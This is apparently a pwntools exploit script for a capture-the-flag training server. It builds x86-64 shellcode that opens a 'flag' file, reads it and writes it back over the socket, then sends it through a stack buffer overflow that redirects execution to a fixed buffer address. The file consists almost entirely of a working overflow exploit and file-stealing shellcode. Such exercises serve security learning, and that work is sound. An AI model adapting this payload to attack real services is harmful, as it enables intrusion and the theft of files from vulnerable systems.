#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host training.jinblack.it --port 2005 server
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('server')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'training.jinblack.it'
port = int(args.PORT or 2005)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments

point = 1016
buffer_addr = p64(0x004040c0)
displace = b'\x90' * 8

# in rdi there is the file descriptor or the socket!
'''
f = open("flag", 0, 0); 		// return a file descriptor
read(f, buffer + something, 50);	// read flag content
write(socket_fd, buffer+something, 50);	// write to our socket
'''
code = 'push rdi\n' 		# push the socket file descriptor
code += 'push 0x67616c66\n' 	# 'flag'
code += 'mov rdi, rsp\n' 	# rdi = rsp = address of 'flag'
code += 'xor rsi, rsi\n' 	# reset rsi and rdx
code += 'xor rdx, rdx\n'
code += 'mov rax, 0x2\n' 	# syscall 2
code += 'syscall\n' 		# puts f in rax
code += 'pop rbx\n' 		# because i want a tidy stack :)
code += 'mov rdi, rax\n'	# put f in rdi
code += 'mov rsi, rsp\n'	# let's write on the stack
code += 'add rsi, 0xb\n'
code += 'mov rdx, 0xf0\n'	# read 0xf0 charsalcalc 
code += 'mov rax, 0x0\n'
code += 'syscall\n' 		# read, puts content in rsi
code += 'pop rdi\n' 		# rdi = socket_fd
code += 'mov rax, 0x01\n'
code += 'syscall\n' 		# GOTCHA

sh = asm(code)

print('shellcode len=', len(sh))

io = start()
io.send(displace + sh + b'\x90' * (point - len(sh) - 16) + displace + buffer_addr + b'\x90' * 8)
#io.sendline(b'cat flag')

io.interactive()

